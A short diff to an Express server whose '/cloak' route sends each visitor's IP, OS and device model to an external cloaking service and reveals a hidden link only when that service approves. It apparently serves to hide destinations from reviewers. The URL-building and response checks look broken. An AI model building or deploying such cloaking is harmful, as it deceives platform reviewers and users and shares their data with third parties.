@@ -13,7 +13,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 
 const app = express();
-const port = 3001;
+const port = 80;
 
 const firebaseConfig = {
     projectId: 'sdf79abhj4b2jhb',
@@ -41,14 +41,16 @@ app.get('/cloak', (req, res) => {
         console.log(data);
 
         if(data?.enabled === 1){
-            axios.get(
-                `
+            let url = `
                 ${data?.cloak}?
                 ip=${ip}&
                 systemName=${ua?.os.name}&
                 systemVersion=${ua?.os.version}&
                 model=${ua?.device.model}
-                `
+            `
+            console.log(url);
+            axios.get(
+                url
             ).then(response => {
                 if(+response === 1){
                     res.send({'status': 1, link: data?.link})
